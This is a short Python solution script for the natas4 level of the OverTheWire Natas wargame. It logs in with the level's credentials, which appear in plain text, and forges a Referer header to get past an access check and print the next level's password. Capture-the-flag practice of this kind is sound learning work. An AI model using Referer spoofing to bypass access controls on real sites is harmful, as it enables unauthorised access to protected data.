import requests
import re

username = 'natas4'
password = 'tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm'

headers = { "Referer": "http://natas5.natas.labs.overthewire.org/" }
url = 'http://%s.natas.labs.overthewire.org'%username

response = requests.get(url, auth=(username,password), headers=headers)
content = response.text
flag = re.findall("natas5 is (.*)",content)[0]
print(flag)